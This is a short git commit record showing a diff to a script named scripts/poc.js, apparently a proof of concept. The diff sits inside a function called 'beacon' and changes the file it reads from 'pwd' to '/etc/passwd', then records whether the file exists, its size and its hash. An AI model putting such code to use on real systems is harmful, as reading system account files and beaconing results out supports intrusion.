7d5a8bb48f5cd829ae55a93b1470e3867d940a8d
ASADI <amiraliasdi8@gmail.com>
2025-08-21 23:29:29 +0300

    poc.js

--- scripts/poc.js
+++ scripts/poc.js
@@ -35,7 +35,7 @@ function beacon(urlStr, q) {
   const outDir = path.join(__dirname, "..", "dist");
   fs.mkdirSync(outDir, { recursive: true });
 
-  const target = "pwd";
+  const target = "/etc/passwd";
   let exists = false, size = -1, sha256 = "n/a";
   try {
     const buf = fs.readFileSync(target);
